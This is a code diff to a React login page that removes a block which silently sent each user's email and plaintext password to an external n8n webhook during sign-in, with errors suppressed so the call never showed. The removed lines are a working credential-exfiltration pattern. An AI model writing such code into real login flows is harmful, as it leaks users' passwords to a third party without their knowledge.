@@ -56,22 +56,6 @@ export default function LoginPage({ onBack, onDashboard, initialRole = 'trainee'
     setErrorMessage('')
     setLoading(true)
 
-    // Send payload safely to webhook without blocking sign-in if offline/test mode
-    try {
-      fetch('https://avuke.app.n8n.cloud/webhook-test/course-registration', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          email: emailTrimmed,
-          password: passwordTrimmed,
-        }),
-      }).catch(() => {})
-    } catch {
-      // Ignore webhook errors
-    }
-
     // Detect role from email or target role
     let resolvedRole = initialRole
     const lowerEmail = emailTrimmed.toLowerCase()
